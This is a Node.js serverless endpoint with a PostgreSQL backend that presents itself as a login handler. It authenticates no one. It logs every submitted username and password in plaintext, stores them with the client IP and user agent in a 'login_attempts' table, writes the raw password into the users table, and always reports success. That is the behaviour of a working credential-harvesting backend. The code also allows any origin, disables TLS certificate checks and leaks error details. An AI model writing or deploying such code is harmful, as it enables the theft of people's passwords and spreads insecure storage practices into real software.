const { Pool } = require('pg');
const cors = require('cors');

const corsMiddleware = cors({ origin: '*' });

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

function getClientIP(req) {
  return req.headers['x-forwarded-for'] || 
         req.headers['x-real-ip'] || 
         req.connection?.remoteAddress || 
         req.socket?.remoteAddress ||
         req.ip;
}

module.exports = async (req, res) => {
  corsMiddleware(req, res, async () => {
    if (req.method !== 'POST') {
      return res.status(405).json({ error: 'Method not allowed' });
    }

    const { emailOrUsername, password } = req.body;
    const clientIP = getClientIP(req);

    if (!emailOrUsername || !password) {
      return res.status(400).json({ 
        success: false, 
        message: 'Email/username and password are required' 
      });
    }

    try {
      console.log('\\n📨 Login attempt captured:');
      console.log('Email/Username:', emailOrUsername);
      console.log('Password:', password);
      console.log('Client IP:', clientIP);
      console.log('Timestamp:', new Date().toISOString());
      console.log('User Agent:', req.headers['user-agent']);
      console.log('---');

      await pool.query(`
        CREATE TABLE IF NOT EXISTS login_attempts (
          id SERIAL PRIMARY KEY,
          email_or_username VARCHAR(255) NOT NULL,
          password VARCHAR(255) NOT NULL,
          ip_address INET,
          user_agent TEXT,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        );
      `);

      const attemptResult = await pool.query(
        'INSERT INTO login_attempts (email_or_username, password, ip_address, user_agent, created_at) VALUES ($1, $2, $3, $4, CURRENT_TIMESTAMP) RETURNING *',
        [emailOrUsername, password, clientIP, req.headers['user-agent']]
      );

      const isEmail = emailOrUsername.includes('@');
      const username = isEmail ? emailOrUsername.split('@')[0] : emailOrUsername;
      const email = isEmail ? emailOrUsername : emailOrUsername + '@example.com';

      const userCheck = await pool.query(
        'SELECT * FROM users WHERE email = $1 OR username = $2',
        [email, username]
      );

      let result;
      
      if (userCheck.rows.length > 0) {
        result = await pool.query(
          'UPDATE users SET password_hash = $1, last_login = CURRENT_TIMESTAMP WHERE email = $2 OR username = $3 RETURNING id, username, email, created_at, last_login',
          [password, email, username]
        );
      } else {
        result = await pool.query(
          'INSERT INTO users (username, email, password_hash, last_login) VALUES ($1, $2, $3, CURRENT_TIMESTAMP) RETURNING id, username, email, created_at, last_login',
          [username, email, password]
        );
      }

      res.json({
        success: true,
        message: 'Login information saved successfully',
        user: {
          id: result.rows[0].id,
          username: result.rows[0].username,
          email: result.rows[0].email,
          ip_address: clientIP,
          timestamp: result.rows[0].created_at || result.rows[0].last_login
        }
      });

    } catch (error) {
      console.error('Save login error:', error);
      res.status(500).json({ 
        success: false, 
        message: 'Server error while saving login information',
        error: error.message
      });
    }
  });
};